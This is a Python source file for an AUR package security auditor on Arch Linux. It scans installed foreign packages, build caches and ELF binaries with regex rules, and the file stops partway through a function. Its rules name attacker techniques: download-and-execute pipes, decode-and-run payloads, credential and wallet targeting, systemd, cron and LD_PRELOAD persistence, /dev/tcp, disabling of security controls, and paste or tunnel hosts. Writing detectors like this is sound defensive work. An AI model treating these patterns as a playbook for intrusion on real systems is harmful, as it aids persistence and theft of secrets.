#!/usr/bin/env python3
"""
AUR Security Auditor
Static and runtime-oriented auditing for foreign/AUR packages on Arch Linux.
No package file is modified. Network access is controlled by explicit dashboard scan options.
"""
from __future__ import annotations

import argparse
import concurrent.futures
import datetime as dt
import hashlib
import html
import json
import math
import os
import re
import shutil
import stat
import subprocess
import sys
import tempfile
import threading
import time
import pwd
import urllib.parse
import urllib.request
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Iterable, Optional

VERSION = "1.4.7"
MAX_TEXT_BYTES = 8 * 1024 * 1024
MAX_STRINGS_BYTES = 128 * 1024 * 1024

SEVERITY_POINTS = {"critical": 100, "high": 40, "medium": 15, "low": 5, "info": 0}

RULES = [
    ("critical", "atomic-arch-ioc", re.compile(r"\batomic-lockfile\b", re.I),
     "Known Atomic Arch campaign indicator"),
    ("critical", "shell-download-exec", re.compile(
        r"(curl|wget)\b[^\n|;&]{0,500}(?:\||&&|;)\s*(?:sudo\s+)?(?:ba|z|fi|da)?sh\b", re.I),
     "Downloads content and immediately executes it"),
    ("critical", "encoded-payload-exec", re.compile(
        r"(?:base64\s+(?:-d|--decode)|openssl\s+enc\s+-d|xxd\s+-r)[^\n|;&]{0,300}"
        r"(?:\||&&|;)\s*(?:ba|z|fi|da)?sh\b", re.I),
     "Decodes and executes an embedded payload"),
    ("high", "npm-bun-install-hook", re.compile(
        r"\b(?:npm|npx|bun|bunx|pnpm|yarn)\b[^\n]{0,250}\b(?:install|add|exec|run|postinstall|preinstall)\b", re.I),
     "Package-manager execution during build/install"),
    ("high", "credential-targeting", re.compile(
        r"(?:\.ssh/(?:id_|authorized_keys|known_hosts)|credentials|wallet\.dat|"
        r"Login Data|Cookies|Local State|discord|telegram|slack|vault token|"
        r"AWS_(?:ACCESS|SECRET)|GITHUB_TOKEN|SSH_AUTH_SOCK)", re.I),
     "References credential, session, wallet, or messaging data"),
    ("high", "persistence-systemd", re.compile(
        r"(?:systemctl\s+(?:--user\s+)?enable|/etc/systemd/system|"
        r"\.config/systemd/user|WantedBy\s*=|Restart\s*=\s*always)", re.I),
     "Creates or enables systemd persistence"),
    ("high", "persistence-loader", re.compile(
        r"(?:/etc/ld\.so\.preload|LD_PRELOAD|/etc/profile\.d/|"
        r"/etc/cron\.|crontab\s+-|@reboot|\.bashrc|\.zshrc)", re.I),
     "Touches a common persistence or loader mechanism"),
    ("high", "kernel-ebpf", re.compile(
        r"\b(?:bpf|ebpf|bpftool|BPF_PROG_LOAD|bpf\()\b|/sys/fs/bpf", re.I),
     "References eBPF or kernel-level instrumentation"),
    ("high", "suid-capability", re.compile(
        r"(?:chmod\s+(?:[ug+]*s|[24][0-7]{3})|setcap\s+[^;\n]+cap_(?:sys_admin|net_admin|sys_ptrace|dac_read_search))", re.I),
     "Sets SUID/SGID or powerful Linux capabilities"),
    ("high", "security-disable", re.compile(
        r"(?:setenforce\s+0|apparmor_parser\s+-R|systemctl\s+(?:stop|disable)\s+"
        r"(?:auditd|firewalld|ufw)|iptables\s+-F|nft\s+flush\s+ruleset)", re.I),
     "Attempts to disable security controls"),
    ("medium", "network-client", re.compile(
        r"\b(?:curl|wget|ncat|socat|telnet|ssh|scp|rsync)\b|"
        r"/dev/(?:tcp|udp)/|urllib\.request|requests\.(?:get|post)\s*\(|"
        r"http\.(?:get|post)\s*\(|fetch\s*\(\s*(?:[\"'`]/|[\"'`]https?://)", re.I),
     "Contains outbound network-capable code"),
    ("medium", "direct-ip-url", re.compile(
        r"https?://(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?", re.I),
     "Uses a direct IP address in an HTTP(S) URL"),
    ("medium", "process-hiding", re.compile(
        r"(?:/proc/\d+/(?:mem|maps)|hide[_ -]?(?:process|file|port|socket|pid)|"
        r"hidden[_ -]?(?:pids?|names?|inodes?|ports?|sockets?)|"
        r"NETLINK_SOCK_DIAG|inet_diag|/sys/fs/bpf/hidden_(?:pids|names|inodes))", re.I),
     "References explicit process, file, or socket hiding primitives"),
    ("medium", "shell-eval", re.compile(
        r"\beval\s+[\"'$(`]|\bexec\s+(?:ba|z|fi|da)?sh\b", re.I),
     "Uses dynamic shell evaluation or shell replacement"),
    ("medium", "suspicious-temp-exec", re.compile(
        r"(?:/tmp|/var/tmp|/dev/shm)/[^\s'\";|]{1,120}.*(?:chmod\s+\+x|exec|nohup)", re.I),
     "Executes content from a temporary directory"),
    ("low", "checksum-skipped", re.compile(
        r"(?:sha(?:256|512)sums|b2sums|md5sums)\s*=\s*\([^)]*['\"]SKIP['\"]", re.I | re.S),
     "PKGBUILD skips source verification"),
    ("low", "install-script", re.compile(r"\b(?:pre|post)_(?:install|upgrade|remove)\s*\(\)", re.I),
     "Package install lifecycle hook present"),
]

URL_RE = re.compile(r"https?://[^\s'\"<>()\]\\]+", re.I)
IP_RE = re.compile(r"(?<![\d.])(?:\d{1,3}\.){3}\d{1,3}(?![\d.])")
EXEC_EXTENSIONS = {".sh", ".bash", ".zsh", ".fish", ".py", ".pl", ".rb", ".js", ".mjs", ".cjs",
                   ".service", ".timer", ".socket", ".path", ".desktop", ".install", ".hook",
                   ".conf", ".rules", ".profile", ".env", ".toml", ".yaml", ".yml", ".json", ""}
IGNORE_PATH_PREFIXES = ("/usr/share/doc/", "/usr/share/licenses/", "/usr/share/man/",
                        "/usr/share/locale/", "/usr/share/icons/", "/usr/share/mime/")

@dataclass
class Finding:
    severity: str
    rule: str
    package: str
    path: str
    message: str
    evidence: str = ""
    line: int = 0
    sha256: str = ""

@dataclass
class PackageResult:
    name: str
    version: str
    aur_status: str = "unknown"
    aur_maintainer: Optional[str] = None
    aur_out_of_date: Optional[int] = None
    aur_version: str = ""
    aur_votes: int = 0
    aur_popularity: float = 0.0
    aur_first_submitted: Optional[int] = None
    aur_last_modified: Optional[int] = None
    security_surface: list[dict] = field(default_factory=list)
    source_provenance: dict = field(default_factory=dict)
    aur_history: dict = field(default_factory=dict)
    files_checked: int = 0
    bytes_checked: int = 0
    integrity_output: str = ""
    findings: list[Finding] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)


class Console:
    """Thread-safe terminal UI with TTY progress, verbose output and logfile."""

    COLORS = {
        "reset": "\033[0m",
        "dim": "\033[2m",
        "bold": "\033[1m",
        "red": "\033[31m",
        "yellow": "\033[33m",
        "blue": "\033[34m",
        "green": "\033[32m",
        "magenta": "\033[35m",
        "cyan": "\033[36m",
    }

    def __init__(self, args, log_path: Optional[Path]):
        self.args = args
        self.lock = threading.RLock()
        self.started = time.monotonic()
        self.last_render = 0.0
        self.progress_visible = False
        self.phase_name = "Start"
        self.current_package = ""
        self.current_detail = ""
        self.package_total = 0
        self.package_done_count = 0
        self.file_total = 0
        self.file_done_count = 0
        self.active_packages: set[str] = set()
        self.package_started_at: dict[str, float] = {}
        self.finding_counts = {s: 0 for s in SEVERITY_POINTS}
        self.quiet = bool(args.quiet)
        self.verbose = int(args.verbose or 0)
        self.color = (
            args.color == "always"
            or (args.color == "auto" and sys.stdout.isatty() and os.environ.get("TERM") != "dumb")
        )
        self.progress = (
            not self.quiet
            and (
                args.progress == "always"
                or (args.progress == "auto" and sys.stdout.isatty() and os.environ.get("TERM") != "dumb")
            )
        )
        self.log_path = log_path
        self.log_handle = None
        if log_path is not None:
            log_path.parent.mkdir(parents=True, exist_ok=True)
            self.log_handle = log_path.open("a", encoding="utf-8", buffering=1)
            self._write_log(f"=== AUR Security Auditor {VERSION} started {dt.datetime.now().isoformat()} ===")

    def close(self) -> None:
        with self.lock:
            self.clear_progress()
            if self.log_handle:
                self._write_log(f"=== finished after {self.format_duration(time.monotonic() - self.started)} ===")
                self.log_handle.close()
                self.log_handle = None

    def _write_log(self, message: str) -> None:
        if self.log_handle:
            timestamp = dt.datetime.now().astimezone().isoformat(timespec="seconds")
            self.log_handle.write(f"{timestamp} {message}\n")

    def paint(self, value: str, color: str) -> str:
        if not self.color:
            return value
        return f"{self.COLORS[color]}{value}{self.COLORS['reset']}"

    @staticmethod
    def format_duration(seconds: float) -> str:
        seconds = max(0, int(seconds))
        hours, remainder = divmod(seconds, 3600)
        minutes, secs = divmod(remainder, 60)
        if hours:
            return f"{hours:02d}:{minutes:02d}:{secs:02d}"
        return f"{minutes:02d}:{secs:02d}"

    @staticmethod
    def shorten(value: str, width: int) -> str:
        if width <= 1:
            return ""
        if len(value) <= width:
            return value
        return "…" + value[-(width - 1):]

    def clear_progress(self) -> None:
        if self.progress_visible:
            sys.stdout.write("\r\033[2K")
            sys.stdout.flush()
            self.progress_visible = False

    def line(self, message: str, *, log: bool = True, stderr: bool = False) -> None:
        with self.lock:
            self.clear_progress()
            if not self.quiet or stderr:
                stream = sys.stderr if stderr else sys.stdout
                print(message, file=stream, flush=True)
            if log:
                plain = re.sub(r"\x1b\[[0-9;]*m", "", message)
                self._write_log(plain)
            self.render(force=True)

    def debug(self, message: str, level: int = 1) -> None:
        if self.verbose >= level:
            self.line(self.paint("→ ", "dim") + message)

    def warning(self, message: str) -> None:
        self.line(self.paint("WARNUNG: ", "yellow") + message, stderr=True)

    def error(self, message: str) -> None:
        self.line(self.paint("FEHLER: ", "red") + message, stderr=True)

    def banner(self) -> None:
        if self.quiet:
            return
        progress_state = self.progress
        self.progress = False
        try:
            self.line(self.paint(f"AUR Security Auditor {VERSION}", "bold"), log=False)
            self.line("Statische Paketprüfung · Integrität · Build-Caches · Laufzeitindikatoren", log=False)
            self.line("", log=False)
        finally:
            self.progress = progress_state

    def set_phase(self, phase: str, detail: str = "") -> None:
        with self.lock:
            self.phase_name = phase
            self.current_detail = detail
            self._write_log(f"PHASE {phase}" + (f": {detail}" if detail else ""))
            if self.verbose:
                self.line(self.paint("▶ ", "cyan") + phase + (f": {detail}" if detail else ""))
            else:
                self.render(force=True)

    def set_totals(self, packages: int, files: int) -> None:
        with self.lock:
            self.package_total = packages
            self.file_total = files
            self.render(force=True)

    def inventory(self, done: int, total: int, package: str, files: int) -> None:
        with self.lock:
            self.phase_name = "Inventarisierung"
            self.package_done_count = done
            self.package_total = total
            self.current_package = package
            self.current_detail = f"{files:,} Dateien".replace(",", ".")
            self.render(force=True)

    def reset_scan_counters(self) -> None:
        with self.lock:
            self.package_done_count = 0
            self.file_done_count = 0
            self.current_package = ""
            self.current_detail = ""
            self.active_packages.clear()
            self.package_started_at.clear()

    def package_start(self, package: str, version: str) -> None:
        with self.lock:
            self.active_packages.add(package)
            self.package_started_at[package] = time.monotonic()
            self.current_package = package
            self.current_detail = "Paketprüfung"
            self._write_log(f"PACKAGE START {package} {version}")
            if self.verbose >= 1:
                self.line(self.paint("→ ", "cyan") + f"{package} {version}: Prüfung gestartet")
            else:
                self.render(force=True)

    def stage(self, package: str, detail: str) -> None:
        with self.lock:
            self.current_package = package
            self.current_detail = detail
            if self.verbose >= 1:
                self.debug(f"{package}: {detail}", 1)
            else:
                self.render()

    def file_scanned(self, package: str, path: str, findings: list[Finding]) -> None:
        with self.lock:
            self.file_done_count += 1
            self.current_package = package
            self.current_detail = path
            for finding in findings:
                self.finding_counts[finding.severity] += 1
            if self.verbose >= 2:
                self.line(self.paint("  FILE ", "dim") + f"{package}: {path}")
            if findings:
                for finding in findings:
                    if self.verbose >= 1 or finding.severity in {"critical", "high"}:
                        severity_color = {
                            "critical": "red",
                            "high": "magenta",
                            "medium": "yellow",
                            "low": "blue",
                            "info": "dim",
                        }[finding.severity]
                        self.line(
                            self.paint(f"  {finding.severity.upper():8}", severity_color)
                            + f" {package} · {finding.rule} · {finding.path}"
                        )
                    self._write_log(
                        f"FINDING {finding.severity.upper()} {package} {finding.rule} "
                        f"{finding.path}:{finding.line} {finding.message}"
                    )
            self.render()

    def auxiliary_findings(self, package: str, detail: str, findings: list[Finding]) -> None:
        with self.lock:
            self.current_package = package
            self.current_detail = detail
            for finding in findings:
                self.finding_counts[finding.severity] += 1
                if self.verbose >= 1 or finding.severity in {"critical", "high"}:
                    severity_color = {
                        "critical": "red",
                        "high": "magenta",
                        "medium": "yellow",
                        "low": "blue",
                        "info": "dim",
                    }[finding.severity]
                    self.line(
                        self.paint(f"  {finding.severity.upper():8}", severity_color)
                        + f" {package} · {finding.rule} · {finding.path}"
                    )
                self._write_log(
                    f"FINDING {finding.severity.upper()} {package} {finding.rule} "
                    f"{finding.path}:{finding.line} {finding.message}"
                )
            self.render()

    def package_done(self, result: PackageResult) -> None:
        with self.lock:
            self.package_done_count += 1
            self.active_packages.discard(result.name)
            elapsed = time.monotonic() - self.package_started_at.pop(result.name, time.monotonic())
            counts = {s: 0 for s in SEVERITY_POINTS}
            for finding in result.findings:
                counts[finding.severity] += 1
            dangerous = counts["critical"] + counts["high"]
            if dangerous:
                symbol = self.paint("!", "red")
                state = self.paint(
                    f"C{counts['critical']}/H{counts['high']}/M{counts['medium']}/L{counts['low']}",
                    "red",
                )
            elif result.findings:
                symbol = self.paint("~", "yellow")
                state = self.paint(
                    f"C0/H0/M{counts['medium']}/L{counts['low']}",
                    "yellow",
                )
            else:
                symbol = self.paint("✓", "green")
                state = self.paint("OK", "green")
            files = f"{result.files_checked:,}".replace(",", ".")
            self.line(
                f"{symbol} [{self.package_done_count:>{len(str(max(1, self.package_total)))}}/"
                f"{self.package_total}] {result.name} {result.version} · "
                f"{files} Dateien · {state} · {self.format_duration(elapsed)}"
            )
            self._write_log(
                f"PACKAGE DONE {result.name} files={result.files_checked} "
                f"critical={counts['critical']} high={counts['high']} "
                f"medium={counts['medium']} low={counts['low']} elapsed={elapsed:.2f}s"
            )

    def render(self, force: bool = False) -> None:
        if not self.progress:
            return
        now = time.monotonic()
        if not force and now - self.last_render < 0.10:
            return
        self.last_render = now

        if self.phase_name == "Inventarisierung":
            denominator = max(1, self.package_total)
            progress = min(1.0, self.package_done_count / denominator)
            done_label = f"Pakete {self.package_done_count}/{self.package_total}"
        else:
            denominator = max(1, self.file_total)
            progress = min(1.0, self.file_done_count / denominator)
            done_label = (
                f"Pakete {self.package_done_count}/{self.package_total} · "
                f"Dateien {self.file_done_count:,}/{self.file_total:,}"
            ).replace(",", ".")

        elapsed = now - self.started
        eta = ""
        completed_units = self.package_done_count if self.phase_name == "Inventarisierung" else self.file_done_count
        total_units = self.package_total if self.phase_name == "Inventarisierung" else self.file_total
        if completed_units > 0 and total_units > completed_units:
            remaining = elapsed / completed_units * (total_units - completed_units)
            eta = f" · ETA {self.format_duration(remaining)}"

        columns = shutil.get_terminal_size((120, 20)).columns
        bar_width = max(10, min(28, columns // 5))
        filled = int(bar_width * progress)
        bar = "█" * filled + "░" * (bar_width - filled)
        pct = f"{progress * 100:5.1f}%"
        hits = (
            f"C{self.finding_counts['critical']}/H{self.finding_counts['high']}/"
            f"M{self.finding_counts['medium']}/L{self.finding_counts['low']}"
        )
        prefix = (
            f"{self.paint('[' + bar + ']', 'cyan')} {pct} · {done_label} · "
            f"{self.format_duration(elapsed)}{eta} · {hits}"
        )
        detail = " · ".join(x for x in (self.phase_name, self.current_package, self.current_detail) if x)
        available = max(8, columns - len(re.sub(r"\x1b\[[0-9;]*m", "", prefix)) - 3)
        detail = self.shorten(detail, available)
        sys.stdout.write("\r\033[2K" + prefix + " · " + detail)
        sys.stdout.flush()
        self.progress_visible = True

def run(cmd: list[str], timeout: int = 120) -> subprocess.CompletedProcess[str]:
    """Run a command without a shell and with stable, parseable output."""
    env = os.environ.copy()
    env["LC_ALL"] = "C"
    env["LANG"] = "C"
    try:
        return subprocess.run(
            cmd,
            text=True,
            capture_output=True,
            timeout=timeout,
            check=False,
            env=env,
        )
    except (OSError, subprocess.TimeoutExpired) as exc:
        return subprocess.CompletedProcess(cmd, 127, "", str(exc))

def require_arch() -> None:
    if not shutil.which("pacman"):
        raise SystemExit("ERROR: pacman was not found. This tool is intended for Arch Linux and CachyOS.")

def foreign_packages() -> list[tuple[str, str]]:
    cp = run(["pacman", "-Qm"])
    if cp.returncode not in (0, 1):
        raise RuntimeError(cp.stderr.strip() or "pacman -Qm fehlgeschlagen")
    result = []
    for line in cp.stdout.splitlines():
        parts = line.rsplit(" ", 1)
        if len(parts) == 2:
            result.append((parts[0], parts[1]))
    return result

def cache_roots_for_users() -> list[Path]:
    """Find AUR-helper caches for the invoking user and local home directories."""
    homes: list[Path] = []

    sudo_user = os.environ.get("SUDO_USER")
    if sudo_user and sudo_user != "root":
        try:
            homes.append(Path(pwd.getpwnam(sudo_user).pw_dir))
        except KeyError:
            pass

    homes.append(Path.home())

    home_root = Path("/home")
    if home_root.is_dir():
        try:
            homes.extend(p for p in home_root.iterdir() if p.is_dir())
        except OSError:
            pass

    unique_homes: list[Path] = []
    seen = set()
    for home in homes:
        key = str(home.resolve(strict=False))
        if key not in seen:
            seen.add(key)
            unique_homes.append(home)

    roots: list[Path] = []
    for home in unique_homes:
        roots.extend([
            home / ".cache/yay",
            home / ".cache/paru/clone",
            home / ".cache/pikaur/build",
        ])
    roots.append(Path("/var/cache/yay"))

    deduped: list[Path] = []
    seen.clear()
    for root in roots:
        key = str(root.resolve(strict=False))
        if key not in seen:
            seen.add(key)
            deduped.append(root)
    return deduped


def package_files(name: str) -> list[str]:
    cp = run(["pacman", "-Qlq", name])
    if cp.returncode != 0:
        return []
    return [p for p in cp.stdout.splitlines() if p and not p.endswith("/")]

def integrity_has_changes(output: str, returncode: int) -> bool:
    """Interpret pacman -Qkk output without flagging '0 altered files'."""
    if returncode != 0:
        return True
    lowered = output.lower()
    if re.search(r"^\s*(?:warning|error):", lowered, re.M):
        return True
    if re.search(r"\b(?:missing|modified|changed)\b", lowered):
        return True
    if re.search(r"\b[1-9]\d*\s+altered\s+files?\b", lowered):
        return True
    return False


def owner_of(path: str) -> str:
    cp = run(["pacman", "-Qoq", path], timeout=15)
    return cp.stdout.strip() if cp.returncode == 0 else ""

def sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()

def is_probably_text(path: Path) -> bool:
    try:
        with path.open("rb") as f:
            sample = f.read(8192)
        if b"\x00" in sample:
            return False
        return True
    except OSError:
        return False

def snippets(text: str, match: re.Match[str], radius: int = 140) -> tuple[int, str]:
    start = max(0, match.start() - radius)
    end = min(len(text), match.end() + radius)
    line = text.count("\n", 0, match.start()) + 1
    evidence = text[start:end].replace("\x00", "").replace("\r", "")
    evidence = re.sub(r"\s+", " ", evidence).strip()
    return line, evidence[:500]

def scan_text(package: str, path: str, text: str, digest: str = "") -> list[Finding]:
    findings: list[Finding] = []
    seen = set()
    for severity, rule, regex, message in RULES:
        for match in regex.finditer(text):
            line, evidence = snippets(text, match)
            key = (rule, line, evidence[:100])
            if key in seen:
                continue
            seen.add(key)
            findings.append(Finding(severity, rule, package, path, message, evidence, line, digest))
            if sum(1 for x in findings if x.rule == rule) >= 8:
                break

    urls = sorted(set(URL_RE.findall(text)))
    for url in urls[:30]:
        try:
            host = urllib.parse.urlparse(url).hostname or ""
        except ValueError:
            host = ""
        if host and (host.endswith(".onion") or host in {"pastebin.com", "paste.ee", "transfer.sh",
                                                        "ngrok.io", "ngrok-free.app", "webhook.site"}):
            findings.append(Finding("high", "suspicious-host", package, path,
                                    f"Suspicious external host: {host}", url[:500], 0, digest))
    return findings

SECURITY_SURFACE_PATTERNS = (
    ("sudoers", "critical", re.compile(r"^/etc/sudoers(?:\.d/|$)")),
    ("polkit-rule", "high", re.compile(r"^/(?:usr/share|etc)/polkit-1/(?:rules\.d/.+\.rules|actions/.+\.policy)$")),
    ("pam-module", "high", re.compile(r"^/usr/lib/security/.*\.so(?:\.|$)")),
    ("kernel-module", "high", re.compile(r"^/usr/lib/modules/.+\.ko(?:\.(?:xz|zst|gz))?$")),
    ("ld-loader", "high", re.compile(r"^/etc/(?:ld\.so\.preload|ld\.so\.conf(?:\.d/)?)")),
    ("pacman-hook", "medium", re.compile(r"^/usr/share/libalpm/hooks/.+\.hook$")),
    ("systemd-timer", "medium", re.compile(r"^/(?:usr/lib|etc)/systemd/(?:system|user)/.+\.timer$")),
    ("systemd-unit", "medium", re.compile(r"^/(?:usr/lib|etc)/systemd/(?:system|user)/.+\.(?:service|socket|path|mount|automount)$")),
    ("udev-rule", "medium", re.compile(r"^/(?:usr/lib|etc)/udev/rules\.d/.+\.rules$")),
    ("cron", "medium", re.compile(r"^/etc/(?:cron\.(?:d|daily|hourly|weekly|monthly)/|crontab$)")),
    ("autostart", "low", re.compile(r"^/(?:etc/xdg|usr/share)/autostart/.+\.desktop$")),
    ("tmpfiles", "low", re.compile(r"^/usr/lib/tmpfiles\.d/.+\.conf$")),
    ("sysusers", "low", re.compile(r"^/usr/lib/sysusers\.d/.+\.conf$")),
)


def security_surface_for_path(path: str) -> Optional[dict]:
    """Classify installed files that extend privileged or persistent system surfaces."""
    normalized = "/" + path.lstrip("/")
    for kind, impact, pattern in SECURITY_SURFACE_PATTERNS:
        if pattern.search(normalized):
            return {"kind": kind, "impact": impact, "path": normalized}
    return None


def is_elf(path: Path) -> bool:
    try:
        with path.open("rb") as handle:
            return handle.read(4) == b"\x7fELF"
    except OSError:
        return False


def file_entropy(path: Path, limit: int = 4 * 1024 * 1024) -> float:
    """Calculate Shannon entropy from a bounded sample; useful only as correlation context."""
    try:
        with path.open("rb") as handle:
            data = handle.read(limit)
    except OSError:
        return 0.0
    if len(data) < 65536:
        return 0.0
    counts = [0] * 256
    for value in data:
        counts[value] += 1
    total = len(data)
    return -sum((count / total) * math.log2(count / total) for count in counts if count)


def _elf_flags(line: str) -> str:
    parts = line.split()
    if len(parts) < 8:
        return ""
    return "".join(parts[6:-1])


def _unsafe_rpath_entries(value: str) -> list[str]:
    unsafe = []
    for raw in value.split(":"):
        entry = raw.strip()
        if not entry or entry == ".":
            unsafe.append(entry or "<empty>")
            continue
        if entry.startswith(("/tmp", "/var/tmp", "/dev/shm")):
            unsafe.append(entry)
            continue
        if not entry.startswith(("/", "$ORIGIN", "${ORIGIN}")):
            unsafe.append(entry)
            continue
        if entry.startswith("/"):
            try:
                mode = Path(entry).stat().st_mode
            except OSError:
                continue
            if mode & stat.S_IWOTH:
                unsafe.append(entry)
    return unsafe


def inspect_elf(package: str, path: Path, digest: str) -> list[Finding]:
    """Inspect ELF hardening and privilege properties with conservative heuristics."""
    findings: list[Finding] = []
    display = str(path)
    if shutil.which("readelf"):
        program = run(["readelf", "-W", "-l", display], timeout=30)
        if program.returncode == 0:
            for line in program.stdout.splitlines():
                stripped = line.strip()
                flags = _elf_flags(line)
                if stripped.startswith("GNU_STACK") and "E" in flags:
                    findings.append(Finding(
                        "medium", "elf-executable-stack", package, display,
                        "ELF requests an executable process stack", stripped[:500], 0, digest,
                    ))
                elif stripped.startswith("LOAD") and "W" in flags and "E" in flags:
                    findings.append(Finding(
                        "high", "elf-wx-segment", package, display,
                        "ELF contains a writable and executable load segment", stripped[:500], 0, digest,
                    ))
                elif "Requesting program interpreter:" in stripped:
                    interpreter = stripped.split("Requesting program interpreter:", 1)[1].strip(" []")
                    if (not interpreter.startswith("/") or
                            interpreter.startswith(("/tmp/", "/var/tmp/", "/dev/shm/"))):
                        findings.append(Finding(
                            "high", "elf-unsafe-interpreter", package, display,
                            "ELF uses an unsafe or non-absolute program interpreter",
                            interpreter[:500], 0, digest,
                        ))
        dynamic = run(["readelf", "-W", "-d", display], timeout=30)
        if dynamic.returncode == 0:
            for match in re.finditer(r"\((?:RPATH|RUNPATH)\).*?\[([^\]]*)\]", dynamic.stdout):
                value = match.group(1)
                unsafe = _unsafe_rpath_entries(value)
                if unsafe:
                    findings.append(Finding(
                        "high", "elf-unsafe-rpath", package, display,
                        "ELF search path contains an unsafe writable or relative entry",
                        f"RPATH/RUNPATH={value}; unsafe={', '.join(unsafe)}"[:500], 0, digest,
                    ))
    if shutil.which("getcap"):
        capability = run(["getcap", "-n", display], timeout=15)
        output = capability.stdout.strip()
        if capability.returncode == 0 and output:
            dangerous = re.search(
                r"cap_(?:sys_admin|sys_module|sys_ptrace|dac_read_search|dac_override|"
                r"net_admin|bpf|perfmon|sys_rawio|setuid|setgid)\b",
                output,
                re.I,
            )
            findings.append(Finding(
                "high" if dangerous else "medium",
                "file-capabilities", package, display,
                "Installed ELF has Linux file capabilities",
                output[:500], 0, digest,
            ))
    entropy = file_entropy(path)
    if entropy >= 7.65:
        findings.append(Finding(
            "low", "elf-high-entropy", package, display,
            "ELF has unusually high byte entropy", f"entropy={entropy:.3f}", 0, digest,
        ))
    return findings


def strings_for_binary(path: Path) -> str:
    if path.stat().st_size > MAX_STRINGS_BYTES or not shutil.which("strings"):
        return ""
    cp = run(["strings", "-a", "-n", "6", str(path)], timeout=45)
    return cp.stdout[:MAX_TEXT_BYTES] if cp.returncode == 0 else ""

def scan_path(package: str, p: str, deep_binaries: bool) -> tuple[list[Finding], int]:
    path = Path(p)
    try:
        st = path.lstat()
    except OSError:
        return [], 0
    if not stat.S_ISREG(st.st_mode):
        return [], 0
    if any(p.startswith(prefix) for prefix in IGNORE_PATH_PREFIXES):
        return [], 0
    if st.st_size > MAX_STRINGS_BYTES:
        return [], 0

    digest = ""
    try:
        digest = sha256_file(path)
    except OSError:
        pass

    findings: list[Finding] = []
    mode = stat.S_IMODE(st.st_mode)
    if mode & stat.S_ISUID:
        findings.append(Finding("high", "installed-suid", package, p,
                                "Installed file has the SUID bit set", oct(mode), 0, digest))
    if mode & stat.S_ISGID:
        findings.append(Finding("medium", "installed-sgid", package, p,
                                "Installed file has the SGID bit set", oct(mode), 0, digest))

    suffix = path.suffix.lower()
    elf = is_elf(path)
    try:
        if st.st_size <= MAX_TEXT_BYTES and not elf and (suffix in EXEC_EXTENSIONS or is_probably_text(path)):
            text = path.read_text(errors="replace")
            findings.extend(scan_text(package, p, text, digest))
        elif deep_binaries and elf:
            findings.extend(inspect_elf(package, path, digest))
            text = strings_for_binary(path)
            if text:
                findings.extend(scan_text(package, p + " [strings]", text, digest))
        elif deep_binaries and os.access(path, os.X_OK):
            text = strings_for_binary(path)
            if text:
                findings.extend(scan_text(package, p + " [strings]", text, digest))
    except (OSError, UnicodeError):
        pass
    return findings, st.st_size

def local_install_scripts(name: str) -> list[Path]:
    base = Path("/var/lib/pacman/local")
    found = []
    for pkgdir in base.glob(name + "-*"):
        for candidate in ("install", "mtree"):
            p = pkgdir / candidate
            if p.is_file():
                found.append(p)
    return found

def scan_build_cache(package: str, roots: list[Path], callback=None) -> list[Finding]:
    findings = []
    for root in roots:
        pkgroot = root / package
        if not pkgroot.exists():
            continue
        if callback:
            callback("stage", package, f"Build-Cache: {pkgroot}", [])
        for p in pkgroot.rglob("*"):
            if not p.is_file():
                continue
            if ".git/objects" in str(p):
                continue
            if p.name == "PKGBUILD" or p.suffix in {".install", ".sh", ".service", ".hook", ".desktop"}:
                try:
                    text = p.read_text(errors="replace")[:MAX_TEXT_BYTES]
                    current = scan_text(package, str(p), text, sha256_file(p))
                    findings.extend(current)
                    if callback:
                        callback("aux", package, str(p), current)
                except OSError:
                    pass
    return findings

def aur_rpc(packages: list[str]) -> dict[str, dict]:
    output: dict[str, dict] = {}
    for i in range(0, len(packages), 200):
        chunk = packages[i:i+200]
        query = urllib.parse.urlencode([("v", "5"), ("type", "info")] + [("arg[]", p) for p in chunk])
        url = "https://aur.archlinux.org/rpc/?" + query
        req = urllib.request.Request(url, headers={"User-Agent": f"aur-security-auditor/{VERSION}"})
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = json.load(resp)
        for item in data.get("results", []):
            output[item["Name"]] = item
    return output

def scan_one(pkg: tuple[str, str], files: list[str], args, cache_roots: list[Path],
             aur_data: dict[str, dict], callback=None) -> PackageResult:
    name, version = pkg
    result = PackageResult(name=name, version=version)
    if callback:
        callback("start", name, version, [])

    if args.aur_rpc:
        item = aur_data.get(name)
        if item:
            result.aur_status = "aur"
            result.aur_maintainer = item.get("Maintainer")
            result.aur_out_of_date = item.get("OutOfDate")
            result.aur_version = str(item.get("Version") or "")
            result.aur_votes = int(item.get("NumVotes") or 0)
            result.aur_popularity = float(item.get("Popularity") or 0.0)
            result.aur_first_submitted = item.get("FirstSubmitted")
            result.aur_last_modified = item.get("LastModified")
            if not result.aur_maintainer:
                orphan = Finding("medium", "aur-orphaned", name, "AUR RPC",
                                 "Installed AUR package is currently orphaned")
                result.findings.append(orphan)
                if callback:
                    callback("aux", name, "AUR-Metadaten", [orphan])
        else:
            result.aur_status = "foreign-not-in-aur"

    if args.integrity:
        if callback:
            callback("stage", name, "pacman -Qkk", [])
        cp = run(["pacman", "-Qkk", name], timeout=180)
        result.integrity_output = (cp.stdout + cp.stderr).strip()
        if integrity_has_changes(result.integrity_output, cp.returncode):
            integrity_finding = Finding(
                "medium", "integrity-warning", name, "pacman -Qkk",
                "Package integrity check reported differences",
                result.integrity_output[-1000:]
            )
            result.findings.append(integrity_finding)
            if callback:
                callback("aux", name, "pacman -Qkk", [integrity_finding])

    seen_surfaces = set()
    for p in files:
        surface = security_surface_for_path(p)
        if surface:
            key = (surface["kind"], surface["path"])
            if key not in seen_surfaces:
                seen_surfaces.add(key)
                result.security_surface.append(surface)
        fs, size = scan_path(name, p, args.deep_binaries)
        result.findings.extend(fs)
        result.files_checked += 1
        result.bytes_checked += size
        if callback:
            callback("file", name, p, fs)

    for p in local_install_scripts(name):
        if callback:
            callback("stage", name, f"Pacman-Metadaten: {p.name}", [])
        try:
            metadata_findings = scan_text(name, str(p), p.read_text(errors="replace")[:MAX_TEXT_BYTES],
                                          sha256_file(p))
            result.findings.extend(metadata_findings)
            if callback:
                callback("aux", name, str(p), metadata_findings)
        except OSError as exc:
            result.errors.append(f"{p}: {exc}")

    if args.build_cache:
        result.findings.extend(scan_build_cache(name, cache_roots, callback))

